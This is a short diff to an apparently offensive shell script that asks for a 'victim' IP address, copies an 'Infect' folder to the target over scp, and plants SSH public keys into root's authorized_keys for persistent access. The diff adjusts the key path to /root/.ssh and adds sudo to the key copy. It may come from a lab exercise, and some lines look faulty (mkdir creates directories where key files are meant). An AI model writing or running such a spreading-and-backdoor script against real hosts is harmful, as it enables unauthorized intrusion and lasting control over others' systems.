@@ -21,7 +21,7 @@ read -p "Enter Victim IP Address: " IP_Address
 scp -r ./Infect victim@"$IP_Address":/home/victim/Desktop/
 
 # publickey
-SSH_PATH="../../../../root/.ssh"
+SSH_PATH="/root/.ssh"
 
 mkdir -p "$SSH_PATH"/id_rsa.pub
 mkdir -p "$SSH_PATH"/authorized_keys
@@ -34,7 +34,7 @@ ssh-keygen
 #ssh victim@"$IP_Address"
 
 
-scp "$SSH_PATH"/id_rsa.pub victim@"$IP_Address":"$SSH_PATH"
+sudo scp "$SSH_PATH"/id_rsa.pub victim@"$IP_Address":"$SSH_PATH"
 ssh victim@"$IP_Address"
 cat "$SSH_PATH"/id_rsa.pub >> "$SSH_PATH"/authorized_keys
 chmod 700 "$SSH_PATH"
